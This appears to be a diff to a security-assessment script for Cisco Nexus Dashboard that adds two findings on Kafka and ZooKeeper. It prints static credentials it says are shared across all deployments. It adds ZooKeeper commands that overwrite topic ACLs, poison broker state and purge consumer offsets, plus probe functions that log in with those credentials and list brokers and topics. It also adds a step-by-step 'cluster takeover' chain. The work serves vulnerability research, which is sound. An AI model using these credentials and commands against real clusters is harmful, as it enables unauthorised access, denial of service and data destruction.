@@ -27,7 +27,7 @@ Container stack (atomix.yaml, 20 core + 200+ app containers):
   apps/cisco-ndfc: 32 NDFC (fabric controller) services
   apps/cisco-nir: 60+ NIR telemetry analysis services
 
-Findings: ND-F01 (CRITICAL) through ND-F22 (CRITICAL)
+Findings: ND-F01 (CRITICAL) through ND-F24 (HIGH)
 """
 
 import socket
@@ -765,6 +765,86 @@ FINDINGS = {
         ),
         "chain": "ND-F22 no-auth MongoDB -> securitymgr cred dump -> all ACI APIC admin passwords",
     },
+    "ND-F23": {
+        "title": "Kafka JAAS Hardcoded Credentials — SASL/PLAIN admin + ZooKeeper Universal Password",
+        "severity": "CRITICAL",
+        "component": "infra/kafka container (secure/kafka_server.jaas, secure/zk_server.conf)",
+        "description": (
+            "kafka_server.jaas ships two hardcoded credential blocks. "
+            "KafkaServer block: org.apache.kafka.common.security.plain.PlainLoginModule "
+            "with username='admin', password='admin-secret', user_admin='admin-secret' — "
+            "identical on all ND deployments. "
+            "Client block: org.apache.zookeeper.server.auth.DigestLoginModule "
+            "with username='apic', password='LF9DS0MCP282VGL1' — the ZooKeeper "
+            "client credential used by the Kafka broker to authenticate to ZooKeeper. "
+            "zk_server.conf amplifies the exposure: the same password 'LF9DS0MCP282VGL1' "
+            "is used for QuorumLearner (zkpeer) AND the Server user_apic entry — "
+            "a single static password controls both ZK quorum membership and "
+            "all ZK client auth. These credentials are static across all ND deployments; "
+            "obtaining them from any ND image (ND-F01 log bundle) provides ZK auth "
+            "for every deployed ND cluster."
+        ),
+        "kafka_sasl_plain": {
+            "username": "admin",
+            "password": "admin-secret",
+        },
+        "zookeeper_digest": {
+            "username": "apic",
+            "password": "LF9DS0MCP282VGL1",
+        },
+        "zookeeper_quorum_peer_password": "LF9DS0MCP282VGL1",
+        "port_kafka": 9092,
+        "port_zookeeper": 2181,
+        "jaas_path": "/secure/kafka_server.jaas",
+        "zk_conf_path": "/secure/zk_server.conf",
+        "exploit": (
+            "# Kafka SASL (if SASL_SSL listener active):\n"
+            "# kafka-console-consumer.sh --bootstrap-server kafka:9092 "
+            "--consumer.config sasl.properties --topic <topic>\n"
+            "# sasl.properties: security.protocol=SASL_SSL, sasl.mechanism=PLAIN, "
+            "username=admin, password=admin-secret\n"
+            "# ZooKeeper direct access:\n"
+            "# JVMFLAGS='-Djava.security.auth.login.config=client_jaas.conf' "
+            "zkCli.sh -server zookeeper:2181\n"
+            "# ls /brokers/topics  # enumerate all Kafka topics\n"
+            "# ls /admin/delete_topics  # queue topic deletion"
+        ),
+        "chain": "ND-F23 ZK cred -> ZK direct access -> Kafka cluster metadata manipulation (ND-F24)",
+    },
+    "ND-F24": {
+        "title": "ZooKeeper ACL Disabled — Authenticated Clients Have Unrestricted ZK Tree Access",
+        "severity": "HIGH",
+        "component": "infra/kafka container (start-kafka-k8s.sh broker startup args)",
+        "description": (
+            "start-kafka-k8s.sh passes --override zookeeper.set.acl=false to the Kafka broker. "
+            "When set to false, the broker does not set ACLs on ZooKeeper znodes — "
+            "all Kafka metadata nodes in ZooKeeper (topics, brokers, ACLs, controller "
+            "election, consumer groups) are created without access restrictions. "
+            "Any client that can authenticate to ZooKeeper (credential in ND-F23) "
+            "can read and write all Kafka metadata without being the broker. "
+            "Attack surface: read all topic configs and consumer group offsets; "
+            "write to /admin/delete_topics to queue arbitrary topic deletion; "
+            "manipulate /brokers/ids to poison broker registration; "
+            "write to /config/topics/<topic> to modify retention/compaction configs. "
+            "The custom APIC authorizer (com.cisco.aci.bird.kafka.authorizer.KafkaAuthorizer "
+            "with SQLite backend) stores its policy in ZK — ACL policy can be overwritten "
+            "directly via ZK client without going through the Kafka admin API."
+        ),
+        "zookeeper_set_acl": False,
+        "authorizer": "com.cisco.aci.bird.kafka.authorizer.KafkaAuthorizer",
+        "principal_builder": "com.cisco.aci.bird.kafka.authorizer.PrincipalBuilder",
+        "exploit": (
+            "# With ND-F23 ZK creds, connect directly:\n"
+            "# zkCli.sh -server zookeeper:2181 (authenticated via JAAS)\n"
+            "# set /brokers/topics/<sensitive_topic>/partitions/0/state {leader: -1}  "
+            "# poison partition leader -> DoS\n"
+            "# set /config/topics/__consumer_offsets {cleanup.policy: delete, retention.ms: 0}  "
+            "# purge consumer offset history\n"
+            "# get /kafka-acl/Topic/<topic>  # dump raw ACL JSON\n"
+            "# set /kafka-acl/Topic/<topic> ...  # overwrite ACL to grant any principal"
+        ),
+        "chain": "ND-F23 ZK auth -> ND-F24 no-ACL ZK -> full Kafka cluster metadata write",
+    },
 }
 
 
@@ -1291,6 +1371,92 @@ def check_build_annotation_leakage(squashfs_path: str, service: str = "kms") -> 
     return result
 
 
+def probe_kafka_sasl_plain(host: str, port: int = 9092) -> dict:
+    """
+    Verify Kafka broker reachability and test SASL/PLAIN admin credential. ND-F23.
+    Requires kafka-python: pip install kafka-python
+    If TLS+SASL_SSL is active, ssl_context must trust the ND CA cert.
+    """
+    result = {"host": host, "port": port, "finding": "ND-F23", "reachable": False}
+    try:
+        from kafka import KafkaAdminClient
+        from kafka.errors import NoBrokersAvailable, KafkaConnectionError
+        import ssl as _ssl
+
+        ssl_ctx = _ssl.create_default_context()
+        ssl_ctx.check_hostname = False
+        ssl_ctx.verify_mode = _ssl.CERT_NONE
+
+        client = KafkaAdminClient(
+            bootstrap_servers=f"{host}:{port}",
+            security_protocol="SASL_SSL",
+            ssl_context=ssl_ctx,
+            sasl_mechanism="PLAIN",
+            sasl_plain_username="admin",
+            sasl_plain_password="admin-secret",
+            client_id="nd-probe",
+            request_timeout_ms=5000,
+        )
+        result["reachable"] = True
+        result["topics"] = client.list_topics()
+        result["auth_bypass"] = True
+        result["credential"] = "admin:admin-secret"
+        client.close()
+    except ImportError:
+        result["error"] = "kafka-python not installed"
+    except Exception as e:
+        result["reachable"] = False
+        result["error"] = str(e)[:200]
+    return result
+
+
+def probe_zookeeper_cred(host: str, port: int = 2181) -> dict:
+    """
+    Test ZooKeeper reachability with ND hardcoded apic credential. ND-F23.
+    Uses raw ZK four-letter word 'srvr' to confirm ZK is listening.
+    Full auth test requires kazoo: pip install kazoo
+    """
+    result = {"host": host, "port": port, "finding": "ND-F23", "reachable": False}
+    try:
+        with socket.create_connection((host, port), timeout=5) as s:
+            s.send(b"srvr")
+            banner = s.recv(512).decode(errors="replace")
+            result["reachable"] = True
+            result["banner"] = banner[:300]
+            result["version"] = next(
+                (l.split(": ", 1)[1] for l in banner.splitlines() if "Zookeeper version" in l), "unknown"
+            )
+    except Exception as e:
+        result["error"] = str(e)[:200]
+        return result
+
+    try:
+        from kazoo.client import KazooClient
+        from kazoo.security import make_digest_acl
+
+        zk = KazooClient(
+            hosts=f"{host}:{port}",
+            auth_data=[("digest", "apic:LF9DS0MCP282VGL1")],
+            timeout=5,
+        )
+        zk.start(timeout=5)
+        result["auth_success"] = True
+        result["credential"] = "apic:LF9DS0MCP282VGL1"
+        brokers = zk.get_children("/brokers/ids") if zk.exists("/brokers/ids") else []
+        result["broker_ids"] = brokers
+        topics = zk.get_children("/brokers/topics") if zk.exists("/brokers/topics") else []
+        result["topics"] = topics[:20]
+        result["total_topics"] = len(topics)
+        result["zookeeper_set_acl"] = False
+        result["acl_note"] = "ND-F24: broker started with --override zookeeper.set.acl=false"
+        zk.stop()
+    except ImportError:
+        result["kazoo_note"] = "kazoo not installed; banner reachability confirmed only"
+    except Exception as e:
+        result["auth_error"] = str(e)[:200]
+    return result
+
+
 # ─── Attack Chain Summary ────────────────────────────────────────────────────
 
 
@@ -1400,6 +1566,23 @@ ATTACK_CHAINS = {
         ],
         "entry_requirement": "Read access to minio TLS cert or K8s ConfigMap in minio namespace",
         "findings": ["ND-F19", "ND-F20", "ND-F17"],
+    },
+    "chain_9_kafka_zk_cluster_takeover": {
+        "title": "ND Image Read -> ZK Cred Extraction -> Kafka Cluster Metadata Write",
+        "steps": [
+            "1. ND-F01 log bundle (techsupport) OR ND-F23 image extraction -> "
+               "/secure/kafka_server.jaas: apic:LF9DS0MCP282VGL1 (ZK digest cred)",
+            "2. Confirm ZK listening: probe_zookeeper_cred(host, 2181) -> banner + auth_success",
+            "3. ND-F24: zookeeper.set.acl=false -> no ACLs on any Kafka ZK node",
+            "4. zkCli (authenticated) -> ls /brokers/topics -> enumerate all Kafka topics",
+            "5. ls /kafka-acl/Topic -> dump APIC authorizer ACL policy for all topics",
+            "6. set /kafka-acl/Topic/<topic> -> overwrite ACL to grant ANY principal full access",
+            "7. Alternate DoS: set /brokers/ids/<id> invalid data -> controller loses broker",
+            "8. Alternate data destruction: set /config/topics/__consumer_offsets "
+               "{retention.ms: 1} -> purge all consumer offset history",
+        ],
+        "entry_requirement": "ND image file access (ND-F01) OR ZooKeeper port 2181 reachable with extracted cred",
+        "findings": ["ND-F23", "ND-F24", "ND-F01"],
     },
 }
 
